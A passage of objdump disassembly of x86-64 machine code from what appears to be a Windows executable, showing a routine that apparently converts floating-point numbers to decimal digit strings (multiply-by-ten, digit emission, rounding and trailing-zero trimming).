   140009ee6:	89 c3                	mov    %eax,%ebx
   140009ee8:	e8 93 12 00 00       	call   0x14000b180
   140009eed:	4c 89 e2             	mov    %r12,%rdx
   140009ef0:	48 89 e9             	mov    %rbp,%rcx
   140009ef3:	41 89 c6             	mov    %eax,%r14d
   140009ef6:	e8 c5 12 00 00       	call   0x14000b1c0
   140009efb:	44 8b 50 10          	mov    0x10(%rax),%r10d
   140009eff:	45 85 d2             	test   %r10d,%r10d
   140009f02:	0f 85 28 ff ff ff    	jne    0x140009e30
   140009f08:	48 89 c2             	mov    %rax,%rdx
   140009f0b:	4c 89 f9             	mov    %r15,%rcx
   140009f0e:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140009f13:	e8 68 12 00 00       	call   0x14000b180
   140009f18:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   140009f1d:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140009f21:	4c 89 c1             	mov    %r8,%rcx
   140009f24:	e8 47 0d 00 00       	call   0x14000ac70
   140009f29:	8b 44 24 50          	mov    0x50(%rsp),%eax
   140009f2d:	41 89 c0             	mov    %eax,%r8d
   140009f30:	44 0b 84 24 00 01 00 	or     0x100(%rsp),%r8d
   140009f37:	00 
   140009f38:	0f 85 de 09 00 00    	jne    0x14000a91c
   140009f3e:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   140009f45:	00 
   140009f46:	8b 00                	mov    (%rax),%eax
   140009f48:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140009f4c:	83 e0 01             	and    $0x1,%eax
   140009f4f:	0b 44 24 38          	or     0x38(%rsp),%eax
   140009f53:	0f 85 e5 fe ff ff    	jne    0x140009e3e
   140009f59:	48 89 f0             	mov    %rsi,%rax
   140009f5c:	83 ff 39             	cmp    $0x39,%edi
   140009f5f:	89 5c 24 50          	mov    %ebx,0x50(%rsp)
   140009f63:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140009f68:	48 8d 58 01          	lea    0x1(%rax),%rbx
   140009f6c:	48 8b b4 24 f8 00 00 	mov    0xf8(%rsp),%rsi
   140009f73:	00 
   140009f74:	0f 84 b2 07 00 00    	je     0x14000a72c
   140009f7a:	45 85 f6             	test   %r14d,%r14d
   140009f7d:	0f 8e 61 09 00 00    	jle    0x14000a8e4
   140009f83:	8b 7c 24 50          	mov    0x50(%rsp),%edi
   140009f87:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   140009f8d:	83 c7 31             	add    $0x31,%edi
   140009f90:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140009f95:	4d 89 ee             	mov    %r13,%r14
   140009f98:	4d 89 e5             	mov    %r12,%r13
   140009f9b:	40 88 38             	mov    %dil,(%rax)
   140009f9e:	66 90                	xchg   %ax,%ax
   140009fa0:	48 89 e9             	mov    %rbp,%rcx
   140009fa3:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   140009fa8:	e8 c3 0c 00 00       	call   0x14000ac70
   140009fad:	4d 85 ed             	test   %r13,%r13
   140009fb0:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
   140009fb5:	0f 84 55 03 00 00    	je     0x14000a310
   140009fbb:	4d 85 f6             	test   %r14,%r14
   140009fbe:	0f 84 96 07 00 00    	je     0x14000a75a
   140009fc4:	4d 39 ee             	cmp    %r13,%r14
   140009fc7:	0f 84 8d 07 00 00    	je     0x14000a75a
   140009fcd:	4c 89 f1             	mov    %r14,%rcx
   140009fd0:	e8 9b 0c 00 00       	call   0x14000ac70
   140009fd5:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140009fda:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140009fdf:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
   140009fe4:	e9 5a fb ff ff       	jmp    0x140009b43
   140009fe9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140009ff0:	e8 eb 0c 00 00       	call   0x14000ace0
   140009ff5:	49 89 c5             	mov    %rax,%r13
   140009ff8:	49 89 c4             	mov    %rax,%r12
   140009ffb:	e9 ca fe ff ff       	jmp    0x140009eca
   14000a000:	83 bc 24 00 01 00 00 	cmpl   $0x1,0x100(%rsp)
   14000a007:	01 
   14000a008:	0f 8e e2 02 00 00    	jle    0x14000a2f0
   14000a00e:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000a012:	8b 7c 24 58          	mov    0x58(%rsp),%edi
   14000a016:	83 e8 01             	sub    $0x1,%eax
   14000a019:	39 c7                	cmp    %eax,%edi
   14000a01b:	0f 8c 19 03 00 00    	jl     0x14000a33a
   14000a021:	29 c7                	sub    %eax,%edi
   14000a023:	89 fd                	mov    %edi,%ebp
   14000a025:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000a029:	85 c0                	test   %eax,%eax
   14000a02b:	0f 88 55 05 00 00    	js     0x14000a586
   14000a031:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   14000a035:	89 44 24 7c          	mov    %eax,0x7c(%rsp)
   14000a039:	41 01 c1             	add    %eax,%r9d
   14000a03c:	01 c8                	add    %ecx,%eax
   14000a03e:	89 cf                	mov    %ecx,%edi
   14000a040:	89 44 24 48          	mov    %eax,0x48(%rsp)
   14000a044:	e9 23 f9 ff ff       	jmp    0x14000996c
   14000a049:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000a050:	48 89 ea             	mov    %rbp,%rdx
   14000a053:	4c 89 f9             	mov    %r15,%rcx
   14000a056:	e8 25 11 00 00       	call   0x14000b180
   14000a05b:	85 c0                	test   %eax,%eax
   14000a05d:	0f 89 59 fa ff ff    	jns    0x140009abc
   14000a063:	8b 44 24 54          	mov    0x54(%rsp),%eax
   14000a067:	45 31 c0             	xor    %r8d,%r8d
   14000a06a:	4c 89 f9             	mov    %r15,%rcx
   14000a06d:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000a072:	8d 58 ff             	lea    -0x1(%rax),%ebx
   14000a075:	e8 66 0c 00 00       	call   0x14000ace0
   14000a07a:	49 89 c7             	mov    %rax,%r15
   14000a07d:	8b 44 24 6c          	mov    0x6c(%rsp),%eax
   14000a081:	85 c0                	test   %eax,%eax
   14000a083:	0f 9e c0             	setle  %al
   14000a086:	41 21 c6             	and    %eax,%r14d
   14000a089:	8b 44 24 50          	mov    0x50(%rsp),%eax
   14000a08d:	85 c0                	test   %eax,%eax
   14000a08f:	0f 85 7d 07 00 00    	jne    0x14000a812
   14000a095:	45 84 f6             	test   %r14b,%r14b
   14000a098:	0f 85 ab 06 00 00    	jne    0x14000a749
   14000a09e:	8b 44 24 54          	mov    0x54(%rsp),%eax
   14000a0a2:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   14000a0a6:	8b 44 24 6c          	mov    0x6c(%rsp),%eax
   14000a0aa:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000a0ae:	66 90                	xchg   %ax,%ax
   14000a0b0:	c7 44 24 7c 01 00 00 	movl   $0x1,0x7c(%rsp)
   14000a0b7:	00 
   14000a0b8:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000a0bd:	44 8b 64 24 30       	mov    0x30(%rsp),%r12d
   14000a0c2:	eb 18                	jmp    0x14000a0dc
   14000a0c4:	4c 89 f9             	mov    %r15,%rcx
   14000a0c7:	45 31 c0             	xor    %r8d,%r8d
   14000a0ca:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000a0cf:	e8 0c 0c 00 00       	call   0x14000ace0
   14000a0d4:	83 44 24 7c 01       	addl   $0x1,0x7c(%rsp)
   14000a0d9:	49 89 c7             	mov    %rax,%r15
   14000a0dc:	48 89 ea             	mov    %rbp,%rdx
   14000a0df:	4c 89 f9             	mov    %r15,%rcx
   14000a0e2:	e8 29 f0 ff ff       	call   0x140009110
   14000a0e7:	48 83 c3 01          	add    $0x1,%rbx
   14000a0eb:	8d 78 30             	lea    0x30(%rax),%edi
   14000a0ee:	40 88 7b ff          	mov    %dil,-0x1(%rbx)
   14000a0f2:	44 39 64 24 7c       	cmp    %r12d,0x7c(%rsp)
   14000a0f7:	7c cb                	jl     0x14000a0c4
   14000a0f9:	45 31 f6             	xor    %r14d,%r14d
   14000a0fc:	8b 4c 24 38          	mov    0x38(%rsp),%ecx
   14000a100:	85 c9                	test   %ecx,%ecx
   14000a102:	0f 84 5f 02 00 00    	je     0x14000a367
   14000a108:	83 f9 02             	cmp    $0x2,%ecx
   14000a10b:	41 8b 47 14          	mov    0x14(%r15),%eax
   14000a10f:	0f b6 53 ff          	movzbl -0x1(%rbx),%edx
   14000a113:	0f 84 84 02 00 00    	je     0x14000a39d
   14000a119:	83 f8 01             	cmp    $0x1,%eax
   14000a11c:	0f 8f 5e 01 00 00    	jg     0x14000a280
   14000a122:	41 8b 47 18          	mov    0x18(%r15),%eax
   14000a126:	85 c0                	test   %eax,%eax
   14000a128:	0f 85 52 01 00 00    	jne    0x14000a280
   14000a12e:	45 31 c0             	xor    %r8d,%r8d
   14000a131:	eb 07                	jmp    0x14000a13a
   14000a133:	0f b6 53 fe          	movzbl -0x2(%rbx),%edx
   14000a137:	48 89 c3             	mov    %rax,%rbx
   14000a13a:	48 8d 43 ff          	lea    -0x1(%rbx),%rax
   14000a13e:	80 fa 30             	cmp    $0x30,%dl
   14000a141:	74 f0                	je     0x14000a133
   14000a143:	e9 58 fe ff ff       	jmp    0x140009fa0
   14000a148:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000a14f:	00 
   14000a150:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   14000a157:	00 
   14000a158:	e9 c9 fb ff ff       	jmp    0x140009d26
   14000a15d:	0f 1f 00             	nopl   (%rax)
   14000a160:	c7 44 24 7c 01 00 00 	movl   $0x1,0x7c(%rsp)
   14000a167:	00 
   14000a168:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000a16d:	e9 f3 f4 ff ff       	jmp    0x140009665
   14000a172:	48 63 44 24 54       	movslq 0x54(%rsp),%rax
   14000a177:	c7 44 24 30 ff ff ff 	movl   $0xffffffff,0x30(%rsp)
   14000a17e:	ff 
   14000a17f:	48 8b 15 ca fa 37 00 	mov    0x37faca(%rip),%rdx        # 0x140389c50
   14000a186:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000a18b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000a190:	f2 0f 10 44 24 60    	movsd  0x60(%rsp),%xmm0
   14000a196:	c7 44 24 7c 01 00 00 	movl   $0x1,0x7c(%rsp)
   14000a19d:	00 
   14000a19e:	8b 4c 24 54          	mov    0x54(%rsp),%ecx
   14000a1a2:	66 0f 28 c8          	movapd %xmm0,%xmm1
   14000a1a6:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   14000a1ab:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   14000a1af:	83 c1 01             	add    $0x1,%ecx
   14000a1b2:	4c 8d 47 01          	lea    0x1(%rdi),%r8
   14000a1b6:	89 4c 24 2c          	mov    %ecx,0x2c(%rsp)
   14000a1ba:	f2 0f 2c c1          	cvttsd2si %xmm1,%eax
   14000a1be:	66 0f ef c9          	pxor   %xmm1,%xmm1
   14000a1c2:	f2 0f 2a c8          	cvtsi2sd %eax,%xmm1
   14000a1c6:	8d 50 30             	lea    0x30(%rax),%edx
   14000a1c9:	88 17                	mov    %dl,(%rdi)
   14000a1cb:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   14000a1cf:	f2 0f 5c c1          	subsd  %xmm1,%xmm0
   14000a1d3:	66 0f 2e c6          	ucomisd %xmm6,%xmm0
   14000a1d7:	0f 8b dd 06 00 00    	jnp    0x14000a8ba
   14000a1dd:	8b 54 24 7c          	mov    0x7c(%rsp),%edx
   14000a1e1:	44 8b 4c 24 30       	mov    0x30(%rsp),%r9d
   14000a1e6:	44 39 ca             	cmp    %r9d,%edx
   14000a1e9:	0f 84 d1 01 00 00    	je     0x14000a3c0
   14000a1ef:	f2 0f 10 1d 79 f7 37 	movsd  0x37f779(%rip),%xmm3        # 0x140389970
   14000a1f6:	00 
   14000a1f7:	eb 14                	jmp    0x14000a20d
   14000a1f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000a200:	8b 54 24 7c          	mov    0x7c(%rsp),%edx
   14000a204:	44 39 ca             	cmp    %r9d,%edx
   14000a207:	0f 84 b3 01 00 00    	je     0x14000a3c0
   14000a20d:	f2 0f 59 c3          	mulsd  %xmm3,%xmm0
   14000a211:	83 c2 01             	add    $0x1,%edx
   14000a214:	49 83 c0 01          	add    $0x1,%r8
   14000a218:	89 54 24 7c          	mov    %edx,0x7c(%rsp)
   14000a21c:	66 0f 28 c8          	movapd %xmm0,%xmm1
   14000a220:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   14000a224:	f2 0f 2c c1          	cvttsd2si %xmm1,%eax
   14000a228:	66 0f ef c9          	pxor   %xmm1,%xmm1
   14000a22c:	f2 0f 2a c8          	cvtsi2sd %eax,%xmm1
   14000a230:	8d 50 30             	lea    0x30(%rax),%edx
   14000a233:	41 88 50 ff          	mov    %dl,-0x1(%r8)
   14000a237:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   14000a23b:	f2 0f 5c c1          	subsd  %xmm1,%xmm0
   14000a23f:	66 0f 2e c6          	ucomisd %xmm6,%xmm0
   14000a243:	7a bb                	jp     0x14000a200
   14000a245:	75 b9                	jne    0x14000a200
   14000a247:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a24c:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   14000a251:	45 31 c0             	xor    %r8d,%r8d
   14000a254:	e9 06 f9 ff ff       	jmp    0x140009b5f
   14000a259:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000a260:	8b 54 24 58          	mov    0x58(%rsp),%edx
   14000a264:	4c 89 f9             	mov    %r15,%rcx
   14000a267:	44 89 4c 24 68       	mov    %r9d,0x68(%rsp)
   14000a26c:	e8 8f 0c 00 00       	call   0x14000af00
   14000a271:	44 8b 4c 24 68       	mov    0x68(%rsp),%r9d
   14000a276:	49 89 c7             	mov    %rax,%r15
   14000a279:	e9 80 f7 ff ff       	jmp    0x1400099fe
   14000a27e:	66 90                	xchg   %ax,%ax
   14000a280:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000a285:	eb 19                	jmp    0x14000a2a0
   14000a287:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000a28e:	00 00 
   14000a290:	48 39 c8             	cmp    %rcx,%rax
   14000a293:	0f 84 b6 00 00 00    	je     0x14000a34f
   14000a299:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
   14000a29d:	48 89 c3             	mov    %rax,%rbx
   14000a2a0:	48 8d 43 ff          	lea    -0x1(%rbx),%rax
   14000a2a4:	80 fa 39             	cmp    $0x39,%dl
   14000a2a7:	74 e7                	je     0x14000a290
   14000a2a9:	83 c2 01             	add    $0x1,%edx
   14000a2ac:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   14000a2b2:	88 10                	mov    %dl,(%rax)
   14000a2b4:	e9 e7 fc ff ff       	jmp    0x140009fa0
   14000a2b9:	8b 4b 04             	mov    0x4(%rbx),%ecx
   14000a2bc:	44 29 f7             	sub    %r14d,%edi
   14000a2bf:	44 89 e0             	mov    %r12d,%eax
   14000a2c2:	c7 84 24 08 01 00 00 	movl   $0x0,0x108(%rsp)
   14000a2c9:	00 00 00 00 
   14000a2cd:	8d 57 01             	lea    0x1(%rdi),%edx
   14000a2d0:	29 f8                	sub    %edi,%eax
   14000a2d2:	89 54 24 7c          	mov    %edx,0x7c(%rsp)
   14000a2d6:	39 c8                	cmp    %ecx,%eax
   14000a2d8:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000a2dd:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
   14000a2e1:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000a2e5:	0f 8c 2f f6 ff ff    	jl     0x14000991a
   14000a2eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000a2f0:	8b 44 24 48          	mov    0x48(%rsp),%eax
   14000a2f4:	41 01 d1             	add    %edx,%r9d
   14000a2f7:	8b 6c 24 58          	mov    0x58(%rsp),%ebp
   14000a2fb:	89 c7                	mov    %eax,%edi
   14000a2fd:	01 d0                	add    %edx,%eax
   14000a2ff:	89 44 24 48          	mov    %eax,0x48(%rsp)
   14000a303:	e9 64 f6 ff ff       	jmp    0x14000996c
   14000a308:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000a30f:	00 
   14000a310:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a315:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000a31a:	e9 40 f8 ff ff       	jmp    0x140009b5f
   14000a31f:	90                   	nop
   14000a320:	4c 89 f9             	mov    %r15,%rcx
   14000a323:	44 89 4c 24 58       	mov    %r9d,0x58(%rsp)
   14000a328:	e8 d3 0b 00 00       	call   0x14000af00
   14000a32d:	44 8b 4c 24 58       	mov    0x58(%rsp),%r9d
   14000a332:	49 89 c7             	mov    %rax,%r15
   14000a335:	e9 c4 f6 ff ff       	jmp    0x1400099fe
   14000a33a:	89 c2                	mov    %eax,%edx
   14000a33c:	31 ed                	xor    %ebp,%ebp
   14000a33e:	2b 54 24 58          	sub    0x58(%rsp),%edx
   14000a342:	89 44 24 58          	mov    %eax,0x58(%rsp)
   14000a346:	01 54 24 2c          	add    %edx,0x2c(%rsp)
   14000a34a:	e9 d6 fc ff ff       	jmp    0x14000a025
   14000a34f:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a354:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   14000a35a:	83 44 24 2c 01       	addl   $0x1,0x2c(%rsp)
   14000a35f:	c6 00 31             	movb   $0x31,(%rax)
   14000a362:	e9 39 fc ff ff       	jmp    0x140009fa0
   14000a367:	4c 89 f9             	mov    %r15,%rcx
   14000a36a:	ba 01 00 00 00       	mov    $0x1,%edx
   14000a36f:	e8 1c 0d 00 00       	call   0x14000b090
   14000a374:	48 89 ea             	mov    %rbp,%rdx
   14000a377:	48 89 c1             	mov    %rax,%rcx
   14000a37a:	49 89 c7             	mov    %rax,%r15
   14000a37d:	e8 fe 0d 00 00       	call   0x14000b180
   14000a382:	0f b6 53 ff          	movzbl -0x1(%rbx),%edx
   14000a386:	85 c0                	test   %eax,%eax
   14000a388:	0f 8f f2 fe ff ff    	jg     0x14000a280
   14000a38e:	75 09                	jne    0x14000a399
   14000a390:	83 e7 01             	and    $0x1,%edi
   14000a393:	0f 85 e7 fe ff ff    	jne    0x14000a280
   14000a399:	41 8b 47 14          	mov    0x14(%r15),%eax
   14000a39d:	83 f8 01             	cmp    $0x1,%eax
   14000a3a0:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   14000a3a6:	0f 8f 8e fd ff ff    	jg     0x14000a13a
   14000a3ac:	41 83 7f 18 01       	cmpl   $0x1,0x18(%r15)
   14000a3b1:	45 19 c0             	sbb    %r8d,%r8d
   14000a3b4:	41 f7 d0             	not    %r8d
   14000a3b7:	41 83 e0 10          	and    $0x10,%r8d
   14000a3bb:	e9 7a fd ff ff       	jmp    0x14000a13a
   14000a3c0:	8b 5c 24 38          	mov    0x38(%rsp),%ebx
   14000a3c4:	85 db                	test   %ebx,%ebx
   14000a3c6:	0f 84 f5 03 00 00    	je     0x14000a7c1
   14000a3cc:	83 fb 01             	cmp    $0x1,%ebx
   14000a3cf:	0f 84 6e 04 00 00    	je     0x14000a843
   14000a3d5:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a3da:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   14000a3df:	e9 5a f4 ff ff       	jmp    0x14000983e
   14000a3e4:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000a3e8:	66 0f 28 c8          	movapd %xmm0,%xmm1
   14000a3ec:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000a3f1:	45 31 c0             	xor    %r8d,%r8d
   14000a3f4:	c7 44 24 7c 01 00 00 	movl   $0x1,0x7c(%rsp)
   14000a3fb:	00 
   14000a3fc:	f2 0f 10 15 6c f5 37 	movsd  0x37f56c(%rip),%xmm2        # 0x140389970
   14000a403:	00 
   14000a404:	eb 18                	jmp    0x14000a41e
   14000a406:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000a40d:	00 00 00 
   14000a410:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   14000a414:	83 c2 01             	add    $0x1,%edx
   14000a417:	41 89 e8             	mov    %ebp,%r8d
   14000a41a:	89 54 24 7c          	mov    %edx,0x7c(%rsp)
   14000a41e:	f2 0f 2c c1          	cvttsd2si %xmm1,%eax
   14000a422:	85 c0                	test   %eax,%eax
   14000a424:	74 0f                	je     0x14000a435
   14000a426:	66 0f ef db          	pxor   %xmm3,%xmm3
   14000a42a:	f2 0f 2a d8          	cvtsi2sd %eax,%xmm3
   14000a42e:	41 89 e8             	mov    %ebp,%r8d
   14000a431:	f2 0f 5c cb          	subsd  %xmm3,%xmm1
   14000a435:	48 83 c1 01          	add    $0x1,%rcx
   14000a439:	83 c0 30             	add    $0x30,%eax
   14000a43c:	88 41 ff             	mov    %al,-0x1(%rcx)
   14000a43f:	8b 54 24 7c          	mov    0x7c(%rsp),%edx
   14000a443:	44 39 d2             	cmp    %r10d,%edx
   14000a446:	75 c8                	jne    0x14000a410
   14000a448:	45 84 c0             	test   %r8b,%r8b
   14000a44b:	89 c2                	mov    %eax,%edx
   14000a44d:	74 04                	je     0x14000a453
   14000a44f:	66 0f 28 c1          	movapd %xmm1,%xmm0
   14000a453:	f2 0f 10 0d 45 f5 37 	movsd  0x37f545(%rip),%xmm1        # 0x1403899a0
   14000a45a:	00 
   14000a45b:	66 0f 28 d4          	movapd %xmm4,%xmm2
   14000a45f:	f2 0f 58 d1          	addsd  %xmm1,%xmm2
   14000a463:	66 0f 2f c2          	comisd %xmm2,%xmm0
   14000a467:	0f 87 fc 02 00 00    	ja     0x14000a769
   14000a46d:	f2 0f 5c cc          	subsd  %xmm4,%xmm1
   14000a471:	66 0f 2f c8          	comisd %xmm0,%xmm1
   14000a475:	0f 86 f2 f7 ff ff    	jbe    0x140009c6d
   14000a47b:	66 0f 2e c6          	ucomisd %xmm6,%xmm0
   14000a47f:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a484:	48 89 ca             	mov    %rcx,%rdx
   14000a487:	7a 06                	jp     0x14000a48f
   14000a489:	0f 84 36 04 00 00    	je     0x14000a8c5
   14000a48f:	41 8d 4b 01          	lea    0x1(%r11),%ecx
   14000a493:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   14000a499:	eb 08                	jmp    0x14000a4a3
   14000a49b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000a4a0:	4c 89 ca             	mov    %r9,%rdx
   14000a4a3:	80 7a ff 30          	cmpb   $0x30,-0x1(%rdx)
   14000a4a7:	4c 8d 4a ff          	lea    -0x1(%rdx),%r9
   14000a4ab:	74 f3                	je     0x14000a4a0
   14000a4ad:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   14000a4b2:	89 4c 24 2c          	mov    %ecx,0x2c(%rsp)
   14000a4b6:	e9 a4 f6 ff ff       	jmp    0x140009b5f
   14000a4bb:	44 8b 4c 24 38       	mov    0x38(%rsp),%r9d
   14000a4c0:	48 89 f0             	mov    %rsi,%rax
   14000a4c3:	89 5c 24 50          	mov    %ebx,0x50(%rsp)
   14000a4c7:	4c 8d 70 01          	lea    0x1(%rax),%r14
   14000a4cb:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000a4d0:	48 8b b4 24 f8 00 00 	mov    0xf8(%rsp),%rsi
   14000a4d7:	00 
   14000a4d8:	4c 89 f3             	mov    %r14,%rbx
   14000a4db:	45 85 c9             	test   %r9d,%r9d
   14000a4de:	0f 84 f0 01 00 00    	je     0x14000a6d4
   14000a4e4:	41 83 7f 14 01       	cmpl   $0x1,0x14(%r15)
   14000a4e9:	0f 8e 63 03 00 00    	jle    0x14000a852
   14000a4ef:	83 7c 24 38 02       	cmpl   $0x2,0x38(%rsp)
   14000a4f4:	0f 84 21 02 00 00    	je     0x14000a71b
   14000a4fa:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a4ff:	eb 49                	jmp    0x14000a54a
   14000a501:	41 88 7e ff          	mov    %dil,-0x1(%r14)
   14000a505:	45 31 c0             	xor    %r8d,%r8d
   14000a508:	4c 89 e1             	mov    %r12,%rcx
   14000a50b:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000a510:	e8 cb 07 00 00       	call   0x14000ace0
   14000a515:	4d 39 e5             	cmp    %r12,%r13
   14000a518:	4c 89 f9             	mov    %r15,%rcx
   14000a51b:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000a520:	4c 0f 44 e8          	cmove  %rax,%r13
   14000a524:	45 31 c0             	xor    %r8d,%r8d
   14000a527:	48 89 c3             	mov    %rax,%rbx
   14000a52a:	e8 b1 07 00 00       	call   0x14000ace0
   14000a52f:	48 89 ea             	mov    %rbp,%rdx
   14000a532:	49 89 dc             	mov    %rbx,%r12
   14000a535:	48 89 c1             	mov    %rax,%rcx
   14000a538:	49 89 c7             	mov    %rax,%r15
   14000a53b:	4c 89 f3             	mov    %r14,%rbx
   14000a53e:	e8 cd eb ff ff       	call   0x140009110
   14000a543:	49 83 c6 01          	add    $0x1,%r14
   14000a547:	8d 78 30             	lea    0x30(%rax),%edi
   14000a54a:	4c 89 e2             	mov    %r12,%rdx
   14000a54d:	48 89 e9             	mov    %rbp,%rcx
   14000a550:	e8 2b 0c 00 00       	call   0x14000b180
   14000a555:	85 c0                	test   %eax,%eax
   14000a557:	7f a8                	jg     0x14000a501
   14000a559:	83 ff 39             	cmp    $0x39,%edi
   14000a55c:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000a561:	4c 89 f3             	mov    %r14,%rbx
   14000a564:	0f 84 c2 01 00 00    	je     0x14000a72c
   14000a56a:	4d 89 ee             	mov    %r13,%r14
   14000a56d:	83 c7 01             	add    $0x1,%edi
   14000a570:	4d 89 e5             	mov    %r12,%r13
   14000a573:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   14000a579:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000a57e:	40 88 38             	mov    %dil,(%rax)
   14000a581:	e9 1a fa ff ff       	jmp    0x140009fa0
   14000a586:	8b 7c 24 48          	mov    0x48(%rsp),%edi
   14000a58a:	c7 44 24 7c 00 00 00 	movl   $0x0,0x7c(%rsp)
   14000a591:	00 
   14000a592:	2b 7c 24 30          	sub    0x30(%rsp),%edi
   14000a596:	e9 d1 f3 ff ff       	jmp    0x14000996c
   14000a59b:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   14000a59f:	85 c9                	test   %ecx,%ecx
   14000a5a1:	0f 84 70 f6 ff ff    	je     0x140009c17
   14000a5a7:	44 8b 54 24 6c       	mov    0x6c(%rsp),%r10d
   14000a5ac:	45 85 d2             	test   %r10d,%r10d
   14000a5af:	0f 8e b8 f6 ff ff    	jle    0x140009c6d
   14000a5b5:	f2 0f 10 1d b3 f3 37 	movsd  0x37f3b3(%rip),%xmm3        # 0x140389970
   14000a5bc:	00 
   14000a5bd:	41 bb ff ff ff ff    	mov    $0xffffffff,%r11d
   14000a5c3:	f2 0f 10 0d ad f3 37 	movsd  0x37f3ad(%rip),%xmm1        # 0x140389978
   14000a5ca:	00 
   14000a5cb:	f2 0f 59 c3          	mulsd  %xmm3,%xmm0
   14000a5cf:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   14000a5d3:	f2 0f 58 0d a5 f3 37 	addsd  0x37f3a5(%rip),%xmm1        # 0x140389980
   14000a5da:	00 
   14000a5db:	66 48 0f 7e ca       	movq   %xmm1,%rdx
   14000a5e0:	66 48 0f 7e c8       	movq   %xmm1,%rax
   14000a5e5:	48 c1 ea 20          	shr    $0x20,%rdx
   14000a5e9:	89 c0                	mov    %eax,%eax
   14000a5eb:	81 ea 00 00 40 03    	sub    $0x3400000,%edx
   14000a5f1:	48 c1 e2 20          	shl    $0x20,%rdx
   14000a5f5:	48 09 d0             	or     %rdx,%rax
   14000a5f8:	e9 3f f1 ff ff       	jmp    0x14000973c
   14000a5fd:	41 8b 4d 08          	mov    0x8(%r13),%ecx
   14000a601:	e8 6a 05 00 00       	call   0x14000ab70
   14000a606:	49 8d 55 10          	lea    0x10(%r13),%rdx
   14000a60a:	48 8d 48 10          	lea    0x10(%rax),%rcx
   14000a60e:	48 89 c3             	mov    %rax,%rbx
   14000a611:	49 63 45 14          	movslq 0x14(%r13),%rax
   14000a615:	4c 8d 04 85 08 00 00 	lea    0x8(,%rax,4),%r8
   14000a61c:	00 
   14000a61d:	e8 a6 14 00 00       	call   0x14000bac8
   14000a622:	ba 01 00 00 00       	mov    $0x1,%edx
   14000a627:	48 89 d9             	mov    %rbx,%rcx
   14000a62a:	e8 61 0a 00 00       	call   0x14000b090
   14000a62f:	49 89 c4             	mov    %rax,%r12
   14000a632:	e9 d4 f7 ff ff       	jmp    0x140009e0b
   14000a637:	8b 43 04             	mov    0x4(%rbx),%eax
   14000a63a:	83 c0 01             	add    $0x1,%eax
   14000a63d:	3b 84 24 e8 00 00 00 	cmp    0xe8(%rsp),%eax
   14000a644:	0f 8d fe f3 ff ff    	jge    0x140009a48
   14000a64a:	83 44 24 48 01       	addl   $0x1,0x48(%rsp)
